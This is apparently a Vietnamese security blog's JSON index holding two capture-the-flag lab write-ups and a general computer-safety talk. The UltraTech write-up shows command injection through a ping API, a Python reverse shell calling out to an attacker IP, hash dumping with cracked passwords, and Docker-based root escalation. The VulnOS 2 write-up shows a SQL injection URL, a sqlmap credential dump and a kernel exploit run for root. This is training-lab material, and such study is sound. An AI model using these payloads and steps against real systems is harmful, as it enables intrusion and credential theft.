&#x2F;js&#x2F;, ủa, js là viết tắt của javascript mà, sao lại phải chia ra làm 2 thư mục? Truy cập vào để thấy điều hay ho, &#x2F;javascript&#x2F; từ chối truy cập, còn &#x2F;js&#x2F; thì tèn ten…\nParent Directory\t [ ]\tapi.js      2019-03-22 18:06 \t883[ ]\tapp.js      2019-03-22 18:06    43K[ ]\tapp.min.js  2019-03-22 18:06    19K\nVà api.js\n(function() &#123;    console.warn(&#x27;Debugging ::&#x27;);    function getAPIURL() &#123;\treturn `$&#123;window.location.hostname&#125;:8081`    &#125;        function checkAPIStatus() &#123;\tconst req = new XMLHttpRequest();\ttry &#123;\t    const url = `http://$&#123;getAPIURL()&#125;/ping?ip=$&#123;window.location.hostname&#125;`\t    req.open(&#x27;GET&#x27;, url, true);\t    req.onload = function (e) &#123;\t\tif (req.readyState === 4) &#123;\t\t    if (req.status === 200) &#123;\t\t\tconsole.log(&#x27;The api seems to be running&#x27;)\t\t    &#125; else &#123;\t\t\tconsole.error(req.statusText);\t\t    &#125;\t\t&#125;\t    &#125;;\t    req.onerror = function (e) &#123;\t\tconsole.error(xhr.statusText);\t    &#125;;\t    req.send(null);\t&#125;\tcatch (e) &#123;\t    console.error(e)\t    console.log(&#x27;API Error&#x27;);\t&#125;    &#125;    checkAPIStatus()    const interval = setInterval(checkAPIStatus, 10000);    const form = document.querySelector(&#x27;form&#x27;)    form.action = `http://$&#123;getAPIURL()&#125;/auth`;    &#125;)();\nỞ trên có thể thấy param của API này là “ip”. Nói đến đoạn này tôi cũng thấy mình ngu, ping thì chỉ có ping ip, domain thôi, chứ ai đi ping con gà con vịt? Thế mà đéo thử từ đầu cho đỡ mất thời gian.\nAPI Command Injectionhttp://10.10.3.122:8081/ping?ip=localhostPING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.016 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms \nChạy mượt ngay &#x3D;)) ping localhost mà không mượt thì thôi đấy. Thử chèn lệnh các kiểu xem sao.\nhttp://10.10.3.122:8081/ping?ip=localhost%0aidPING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.017 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 msuid=1002(www) gid=1002(www) groups=1002(www) \nToang, dấu phân tách ở đây tôi dùng là %0a, tương ứng với ký tự ngắt dòng.Từ đoạn này tôi quay sang dùng Postman để gọi API, anh em có thể dùng Burp Suite, nó cũng chả khác mẹ gì trình duyệt đâu, chỉ là hiển thị cho đẹp thôi.\nhttp://10.10.3.122:8081/ping?ip=localhost%0ancusage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl][-m minttl] [-O length] [-P proxy_username] [-p source_port][-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout][-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]\nThấy là netcat ở đây không có option -e, tìm cách khác, xem xem có python, perl, rubi các thứ không…\nhttp://10.10.3.122:8081/ping?ip=localhost%0apython --versionPython 2.7.15rc1http://10.10.3.122:8081/ping?ip=localhost%0apython3 --versionPING localhost(localhost6.localdomain6 (::1)) 56 data bytes64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.016 ms--- localhost ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 msPython 3.6.7\nNgon ngay, cả Python 2 và Python 3 đủ cả. Giờ thì tạo reverse shell ez game.Do server lọc dấu “;”, nên tôi phải dùng “\\n” để thay thế, sẽ không cần option -e của echo để chuyển “\\n” thành ký tự ngắt dòng do URL decode của server tự làm việc đó rồi.\nhttp://10.10.3.122:8081/ping?ip=localhost%0aecho &#x27;import socket,subprocess,os\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((&quot;10.9.226.195&quot;,4444))\\nos.dup2(s.fileno(),0)\\nos.dup2(s.fileno(),1)\\nos.dup2(s.fileno(),2)\\nimport pty\\npty.spawn(&quot;/bin/bash&quot;)&#x27; &gt; shell.pyhttp://10.10.3.122:8081/ping?ip=localhost%0acat shell.pyPING localhost(localhost6.localdomain6 (::1)) 56 data bytes64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.017 ms--- localhost ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 msimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.9.226.195&quot;,4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(&quot;/bin/bash&quot;)\nĐoạn script trông ổn đấy &#x3D;)) Giờ chạy nó và lấy shell thôi.\nGet User Shell$ nc -lnvp 4444                    Listening on 0.0.0.0 4444Connection received on 10.10.3.122 50918www@ultratech-prod:~/api$ iduid=1002(www) gid=1002(www) groups=1002(www)www@ultratech-prod:~/api$ ls -altotal 80drwxr-xr-x   3 www www  4096 Jan 25 15:39 .drwxr-xr-x   5 www www  4096 Mar 22  2019 ..-rw-r--r--   1 www www  1750 Mar 22  2019 index.jsdrwxrwxr-x 163 www www  4096 Mar 22  2019 node_modules-rw-r--r--   1 www www   370 Mar 22  2019 package.json-rw-r--r--   1 www www 42702 Mar 22  2019 package-lock.json-rw-rw-r--   1 www www   212 Jan 25 15:39 shell.py-rw-rw-r--   1 www www   103 Mar 22  2019 start.sh-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlitewww@ultratech-prod:~/api$ cat utech.db.sqlitezz��etableusersusersCREATE TABLE users (            login Varchar,            password Varchar,            type Int���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84www@ultratech-prod:~/api$ \nGame dễ!Tách username với hash password ra, ném hash đấy lên CrackStation xem có được việc gì không.r00t:n100906admin:mrsheafy\nGet Root ShellChả biết thằng admin kia là ai, chỉ thấy thằng r00t có tên trong &#x2F;etc&#x2F;passwd, đăng nhập vào nó ngay và luôn.\nwww@ultratech-prod:~/api$ su r00tPassword: n100906r00t@ultratech-prod:/home/www/api$ iduid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)\nỐi giời ơi! Docker!Kèo này có vẻ leo lên quyền root dễ thở rồi. root chứ không phải r00t nhé :&#x2F;Với Docker thì ngon lành rồi, xem có image nào không, rồi mount nó vào thư mục hệ thống, done!\nr00t@ultratech-prod:~$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEbash                latest              495d6437fc1e        22 months ago       15.8MBr00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh# iduid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)","categories":["TryHackMe"],"tags":["write up","medium","tryhackme"]},{"title":"[Talk] Làm sao để sử dụng máy tính một cách an toàn?","url":"/2021/06/27/using-computer-safely-talk/","content":"Một vài chia sẻ nhỏ nhỏ đúc kết lại sau gần 8 năm ngồi máy tính, kể từ khi trốn nhà đi chơi điện từ những năm cấp 2 cho đến công việc hiện tại, vì là một người có quá nhiều tài liệu học tiếng Nhật nên tôi có chút ít kinh nghiệm dưới đây…\n\nBài viết chủ yếu là về hệ điều hành Windows, nếu bạn dùng Linux, thì chắc bạn cũng thừa biết mấy điều này.\nHãy đặt mật khẩu, làm ơnTại sao bạn lại đếch đặt mật khẩu cho máy tính của mình nhỉ? Ơ kìa? Điều đó sẽ chẳng khiến chiếc máy tính của bạn chậm đi tẹo nào đâu, tôi cam đoan đấy.Lý do phần lớn mọi người chả buồn để mật khẩu chắc là vì sự thuận tiện. Ai cũng muốn ngồi vào máy, nhấn một phím vớ vẩn nào đó và có thể bắt đầu làm việc được ngay. Nhưng ôi bạn ơi, chiếc máy tính yêu quý của bạn không phải lúc nào cũng được ở trong tầm kiểm soát của bạn đâu. Sẽ có những tài liệu phải giữ bí mật này, những phiên đăng nhập trên trình duyệt như mail, mạng xã hội, ngân hàng, ứng dụng trao đổi công việc, bla bla… và sẽ thật tệ nếu ai đó xấu xí tiếp cận với máy tính của bạn mà không được sự cho phép, họ sẽ có hoàn toàn quyền kiểm soát mà chẳng gặp bất kỳ sự khó khăn nào :)Đặt mật khẩu cho máy tính ngay đi nhé!\nLock Screen khi rời khỏi máyYah, bạn đặt mật khẩu cho máy để làm gì khi không sử dụng nó? Mỗi khi rời khỏi máy, hãy tập cho mình một thói quen khóa màn hình lại, chả khó khăn gì cả, chỉ cần nhấn Windown + L là xong, ez! Việc khóa máy sẽ KHÔNG LÀM ẢNH HƯỞNG đến các tiến trình đang chạy, thế nên bạn không cần phải lo lắng việc khóa màn hình sẽ gây ra lỗi tới những công việc đang làm dở.Hơn nữa, bạn nên cài đặt thời gian để máy tính tự động khóa đề phòng trường hợp bạn phải rời máy mà không kịp khóa thủ công (chẳng hạn như việc chạy đi ịa gấp), thời gian chờ tối đa là 15 phút.\nĐừng bỏ qua cảnh báo của phần mềm AntivirusTôi sẽ lấy Windows Defender làm đại diện, nó được cài đặt mặc định trên Windows 10 và dùng cực kỳ tốt, tôi không cần phải cài cắm thêm thằng AV nào khác nữa.Khi mà màn hình hiện lên cái cảnh báo trên, thì có nghĩa là máy của bạn đang gặp rủi ro thật đấy :) đéo đùa đâu. Sự phát triển của các hệ thống phát hiện và cảnh báo rủi ro dựa trên đặc điểm (signature) và hành vi (behavior) sử dụng công nghệ Machine Learning, AI, gì gì đó cao siêu thần thánh trên các phần mềm Anti Virus ở thời điểm hiện tại là có thể tin tưởng (nhất là hàng của MicroSoft, xịn vl).Không nhất thiết phải scan thường xuyên, chỉ cần hiển thị đủ mấy cái tick xanh như ảnh dưới là bạn có thể yên tâm máy tính đang được bảo vệ ngon lành rồi.Tất nhiên sẽ chẳng có hệ thống nào là an toàn cả, nhưng ít nhất thì bạn cũng né đã được cơ số những rủi ro.\nPhân biệt rõ Public Network và Private NetworkCó bao giờ khi bạn kết nối wifi hay cắm mạng dây cho máy tính và hiện lên thông báo này? Ý nghĩa của nó là gì? Tiếng Anh thôi mà, giời ơi.Khi bạn chọn YES, đồng nghĩa với mạng mà bạn đang sử dụng là mạng riêng (Private Network). Lúc này, Windows sẽ hiểu rằng bạn đang sử dụng máy tính trong một mạng an toàn (mạng gia đình, mạng công ty… đại khái là tin tưởng được), một số cơ chế bảo vệ sẽ được tắt đi để tối ưu hóa trải nghiệm của người dùng trong mạng LAN, các tiện ích có thể kể đến như chia sẻ file, stream screen, chơi game mạng LAN, v..v…Nhưng hãy để ý kỹ câu “một số cơ chế bảo vệ sẽ được tắt đi”, đồng nghĩa với việc rủi ro sẽ tăng lên. Đó là lí do khi bạn đem máy ra quán cà phê, hay có thói quen dùng chùa mạng công cộng, thì ĐỪNG BAO GIỜ chọn YES (Private Network) mà hãy chọn NO (Public Network) để báo cho Windows biết máy của bạn đang kết nối vào một mạng công cộng, Windows sẽ gia cố thêm một vài cơ chế phòng thủ để bảo vệ máy tính của bạn.Có thể bạn đếch tin, nhưng những vụ việc như mất tài khoản mạng xã hội, Facebook, Google, hay tài khoản ngân hàng thì phần lớn là tấn công lừa đảo, và rất dễ xảy ra khi sử dụng mạng công cộng.\nHãy tạo thêm một tài khoản người dùng khác trên máy với đặc quyền tối thiểuCó bao giờ bạn nghe đến cụm từ “hệ điều hành đa nhiệm, nhiều người dùng”? Nhiều người dùng ở đây có nghĩa là gì? Có nghĩa là hệ điều hành bạn đang dùng cho phép có nhiều tài khoản sử dụng chung tài nguyên hệ thống.Ví dụ đơn giản, gia đình bạn có 4 người, nhưng lại chỉ có 1 chiếc máy tính, và mỗi người lại có một nhu cầu sử dụng khác nhau, muốn hình nền khác nhau, những tập tin riêng tư, vân vân mây mây… Vấn đề này sẽ được giải quyết ổn thỏa khi chỉ cần tạo ra 4 tài khoản riêng biệt và cấp cho từng người, lúc này, mỗi khi ai đó dùng tài khoản của mình để đăng nhập, người đó sẽ chỉ có thể sử dụng máy trong phiên làm việc của họ mà thôi.Ơ thế tại sao bạn lại nên tạo thêm một tài khoản khác trên máy của bạn nhở?Vì sẽ có lúc nào đó mà bạn cho người khác mượn máy, và bạn hoàn toàn không muốn người ta bén mảng đến phiên làm việc của bạn, những tập tin của bạn, rồi thì Gmail, Facebook, Tinder, Xamvn, Thiendia,… èo ời… Lúc này, bạn chỉ cần ném máy tính của mình cho họ mượn kèm theo tài khoản khác mà bạn đã tạo trên máy. Cấu hình qua một chút, bạn hoàn toàn có thể yên tâm rằng người bạn cho mượn máy sẽ không thể tò mò bất kỳ điều gì từ máy của bạn đâu.\nHãy dùng Tab Ẩn danh khi sử dụng máy tính của người khácCụ thể với Trình duyệtGiống như hệ điều hành, trình duyệt web bây giờ cũng hỗ trợ đa người dùng, ví dụ Google Chrome. Khi mượn máy ai đó để duyệt web, bạn nên sử dụng Tab Ẩn danh, hoặc profile Guest. Vì sao?Bạn sẽ không cần phải đăng xuất Facebook, Google,… của người chủ máy, gây bất tiện cho cả hai. Và nếu chả may bạn quên béng vụ đăng xuất Facebook, Gmail, web ngân hàng… và trả lại máy, thì có phải người ta có thể truy cập vào tài khoản của bạn không? Thay vào đó, nếu bạn sử dụng Tab Ẩn danh hoặc Guest, thì việc bạn làm chỉ cần đóng cửa sổ đó lại, thế là xong.(Mỗi lần đi chơi net là tôi lại vớ được cả đống tài khoản Facebook của các bạn sử dụng máy trước đó, ối giời ơi…)\nNên sử dụng dịch vụ lưu trữ đám mâyNếu bạn là một người đếch quan tâm gì đến việc bảo vệ dữ liệu, hay đúng hơn là bạn chả có cái mẹ gì quan trong để lưu trữ, thì chúc mừng, cuộc sống của bạn dễ thở vl.Còn nếu bạn có những tập tin quan trọng và cần được bảo vệ, muốn truy cập ở mọi nơi thuận tiện, thì nên chọn cho mình một giải pháp lưu trữ đám mây, Google Driver, Dropbox,… Sẽ chẳng ai biết được có một ngày đẹp trời, hoặc không đẹp trời, cái ổ cứng của bạn lăn ra bốc khói, hoặc tệ hơn là cả cái máy luôn &#x3D;)) bao công chạy deadline suốt cả tháng bỗng dưng bay biến. Rén phết đấy :D\nMã hóa ổ cứng nếu có thểỜm, cái này hơi cao cấp tí, nhưng nếu bạn bảo vệ máy tính kỹ càng vcl rồi, có những tập tin tuyệt mật nằm trong máy của bạn, ví dụ như ảnh hoạ mi loa đài các thứ… bạn yêm tâm lắm. Thì đừng lo, sự yên tâm của bạn là vớ vẩn thôi.Tôi hoàn toàn có thể cuỗm máy của bạn, tháo ổ cứng ra, và cắm ổ cứng vào máy của tôi, he~, lúc này tôi có thể lấy tất cả các file đã lưu trên ổ cứng đó một cách dễ dàng vl, kể cả những file chỉ được đọc ghi với quyền Admin&#x2F;Root.Vậy nên nếu cần thiết, hãy mã hóa ổ cứng đi.(và bạn sẽ phải nhớ mật khẩu mã hóa nhé :D vì nếu chả may quên thì cũng coi như mất rồi luôn)\nUpdate hệ điều hành thường xuyên hơnLỗ hổng bảo mật được tìm ra hàng ngày, hàng giờ, và đội ngũ phát triển hệ điều hành luôn làm việc để cho ra những bản cập nhật, bản vá kịp thời để người dùng tránh được sự ảnh hưởng.Nhưng người dùng đéo cập nhật! :DHọ cho rằng bản cập nhật làm chậm máy, làm nóng máy, hiếp dâm con heo, đẩy bà già xuống biển… và họ đéo!Hãy nhớ rằng lập trình viên luôn luôn muốn đưa những sản phẩm tốt nhất đến người dùng của họ :&#x2F; họ chỉ muốn cải tiến mà thôi, giời ơi, không phải cải lùi đâu.\nVà hơn hết, hãy hiểu mình đang làm gìXét cho cùng, con người vẫn luôn là điểm yếu nhất trong hệ thống, bất chấp hệ thống được xây dựng kiên cố đến thế nào.Hãy thực sự hiểu mình đang làm gì với máy tính và bạn sẽ biết được điều gì là tốt nhất cho máy tính của bạn, và cho chính bản thân bạn. Máy tính là để sử dụng, chứ không phải để phục vụ.\nHy vọng bài viết dài loằng ngoằng này sẽ có ích! :D\n","categories":["Talk"],"tags":["talk","safely"]},{"title":"[VulnHub] VulnOS 2","url":"/2021/02/01/vulnos2-vulnhub/","content":"\nOverviewLink download: VULNOS: 2Difficulty: EasyĐuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.\n\nInformation GatheringNmap$ nmap -sn -v 10.10.10.102-105Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:39 +07Initiating Ping Scan at 15:39Scanning 4 hosts [2 ports/host]Completed Ping Scan at 15:39, 1.20s elapsed (4 total hosts)Initiating Parallel DNS resolution of 1 host. at 15:39Completed Parallel DNS resolution of 1 host. at 15:39, 0.04s elapsedNmap scan report for 10.10.10.102 [host down]Nmap scan report for 10.10.10.103Host is up (0.00058s latency).Nmap scan report for 10.10.10.104 [host down]Nmap scan report for 10.10.10.105 [host down]Read data files from: /usr/bin/../share/nmap$ nmap -p- 10.10.10.103 --min-rate 3000Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:39 +07Nmap scan report for 10.10.10.103Host is up (0.00013s latency).Not shown: 65532 closed portsPORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http6667/tcp open  ircNmap done: 1 IP address (1 host up) scanned in 1.05 seconds$ nmap -p 22,80,6667 -A 10.10.10.103   Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:41 +07Nmap scan report for 10.10.10.103Host is up (0.00064s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: VulnOSv26667/tcp open  irc     ngircdService Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds\nCó cái cổng 6667 chạy dịch vụ đéo gì kia, irc, wtf!? Không vội cắm mặt vào cái này, chả đi đến đâu đâu, tôi thử rồi :&#x2F;Tập trung vào cái http server của nó đã.Nhìn cái mặt tiền web site này u tối như chợ đen (đen đúng nghĩa đen). Enumerate cái URL này để kiếm file ẩn.\nDirsearch...bla...bla...bla...[22:05:27] 200 -   10KB - /jabc/includes/[22:05:27] 200 -  117KB - /jabc/includes/bootstrap.inc[22:05:27] 200 -    9KB - /jabc/index.php[22:05:27] 200 -    3KB - /jabc/install.php[22:05:28] 301 -  315B  - /jabc/misc  -&gt;  http://10.10.10.103/jabc/misc/[22:05:28] 301 -  318B  - /jabc/modules  -&gt;  http://10.10.10.103/jabc/modules/[22:05:28] 200 -    9KB - /jabc/modules/[22:05:31] 301 -  319B  - /jabc/profiles  -&gt;  http://10.10.10.103/jabc/profiles/[22:05:31] 200 -  743B  - /jabc/profiles/standard/standard.info[22:05:31] 200 -  278B  - /jabc/profiles/testing/testing.info[22:05:31] 200 -  271B  - /jabc/profiles/minimal/minimal.info[22:05:31] 200 -    2KB - /jabc/robots.txt[22:05:32] 301 -  318B  - /jabc/scripts  -&gt;  http://10.10.10.103/jabc/scripts/[22:05:32] 200 -  949B  - /jabc/scripts/[22:05:32] 301 -  316B  - /jabc/sites  -&gt;  http://10.10.10.103/jabc/sites/[22:05:33] 301 -  320B  - /jabc/templates  -&gt;  http://10.10.10.103/jabc/templates/[22:05:33] 200 -  976B  - /jabc/templates/[22:05:34] 301 -  317B  - /jabc/themes  -&gt;  http://10.10.10.103/jabc/themes/[22:05:34] 200 -    2KB - /jabc/themes/[22:05:34] 403 -    4KB - /jabc/update.php[22:05:35] 200 -   42B  - /jabc/xmlrpc.php\nNền tảng Drupal, phiên bản 7.26, kiếm được ở đâu thì ở đây nhé.&#x2F;jabc&#x2F;profiles&#x2F;standard&#x2F;standard.info\nInformation added by Drupal.org packaging script on 2014-01-15version = &quot;7.26&quot;project = &quot;drupal&quot;datestamp = &quot;1389815930&quot;\nCái đìn địz! Cái chỗ file&#x2F;folder này khiến tôi mất thời gian thực sự nhiều, toàn trap hết, đây là kết luận của tôi sau 15 phút mò mẫm hết cái đống này và chả kiếm chác thêm được gì có giá trị. Quay trở lại với mặt tiền đen xì xì kia, có đoạn này.Cái trò nền đen chữ đen này xưa như trái đất rồi nhé tml!Login vào một web site khác với tài khoản và mật khẩu là guest&#x2F;guest.Cảm thấy tiếc thời gian vào cái đống file enumerate vclĐể ý thấy OpenDocMan v1.2.7. Search lỗi về thằng này ngay và luôn.https://www.exploit-db.com/exploits/32075\n1) SQL Injection in OpenDocMan: CVE-2014-1945The vulnerability exists due to insufficient validation of &quot;add_value&quot; HTTP GET parameter in &quot;/ajax_udf.php&quot; script. A remote unauthenticated attacker can execute arbitrary SQL commands in application&#x27;s database.The exploitation example below displays version of the MySQL server:http://[host]/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9\nRõ ràng &#x3D;)) ném thằng vào Sqlmap chứ còn gì nữa.\nSqlmapDatabase: jabcd0cs                                                                                                       Table: odm_user[3 entries]+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+| id | Email              | phone       | password                                 | username | last_name | department | first_name | pw_reset_code |+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+| 1  | webmin@example.com | 5555551212  | b78aae356709f8c31118ea613980954b         | webmin   | min       | 2          | web        | &lt;blank&gt;       || 2  | guest@example.com  | 555 5555555 | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest    | guest     | 2          | guest      | NULL          |+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+\nb78aae356709f8c31118ea613980954b:webmin1980Đến đây lại mất thêm thời gian để mò mẫm xem admin có làm gì được thêm không, có upload file, enable extention file để upload shell bla bla… đều đéo được :)Một kinh nghiệm được rút ra khi tôi làm bài Writeup-HackTheBox, đó là tài khoản đăng nhập trên Http server hoàn toàn có thể đăng nhập được cả trên SSH, vì sao? Vì con người ấy mà, để tránh phải nhớ nhiều account trên một hệ thống, họ thường có xu hướng để cmn giống hệt nhau.Xét cho cùng, thì con người vẫn luôn là điểm yếu nhất của hệ thống.\nPrivilege EscalationVì có được mật khẩu của user webmin, nên tôi không ngại khoản chạy lệnh sudo, chỉ là sudoer đéo cho tôi vào danh sách thôi :vĐể ý thấy phiên bản kernel hệ điều hành đang chạy là 3.13, hàng cổ đấy, và tôi biết thừa là nó dính lỗi leo quyền vì tôi từng gặp rồi :)))https://www.exploit-db.com/exploits/33824\nwebmin@VulnOSv2:~/duma$ gcc 37292.c -o i_am_grootwebmin@VulnOSv2:~/duma$ ./i_am_groot spawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),1001(webmin)\nDone!\n","categories":["VulnHub"],"tags":["vulnhub","write up","easy"]}]